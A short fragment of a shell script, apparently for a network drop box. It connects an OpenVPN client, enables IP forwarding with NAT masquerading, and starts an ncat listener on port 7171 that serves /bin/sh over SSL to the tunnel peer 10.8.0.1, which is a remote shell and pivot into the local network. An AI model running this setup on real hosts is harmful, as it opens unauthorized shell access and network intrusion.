...
exec_selftest() {
	...
	printf "Tunnel IP Address: \e[4m$tap\e[0m\n" "$tap"
	printf "\n"
...
openvpn --cd /etc/openvpn --config /etc/openvpn/client.conf >> /opt/logs/VPN.log &
sysctl net.ipv4.ip_forward=1
iptables -t nat -A POSTROUTING -j MASQUERADE
ncat -nlvkp 7171 -e /bin/sh --allow 10.8.0.1 --ssl &
